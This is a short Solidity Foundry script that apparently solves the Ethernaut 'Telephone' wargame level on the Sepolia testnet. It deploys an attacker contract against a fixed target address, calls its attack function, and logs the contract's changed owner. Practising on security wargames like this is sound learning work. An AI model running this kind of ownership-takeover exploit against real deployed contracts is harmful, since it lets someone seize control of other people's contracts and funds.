// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import {TelephoneAttacker} from "../src/TelephoneAttacker.sol";
import {Telephone} from "../src/Telephone.sol";

contract TelephoneAttackerScript is Script {
    function run() external {
        address targetAddress = 0xF374f2d7Fb61a4975246B6914fAe96bdb65488Bd;

        vm.startBroadcast(vm.envUint("SEPOLIA_PRIVATE_KEY"));

        TelephoneAttacker attacker = new TelephoneAttacker(targetAddress);
        console.log("Attacker contract deployed to: ", address(attacker));

        attacker.attack();
        console.log("Attack!");

        vm.stopBroadcast();

        address newOwner = Telephone(targetAddress).owner();
        console.log("New owner is:", newOwner);
    }
}
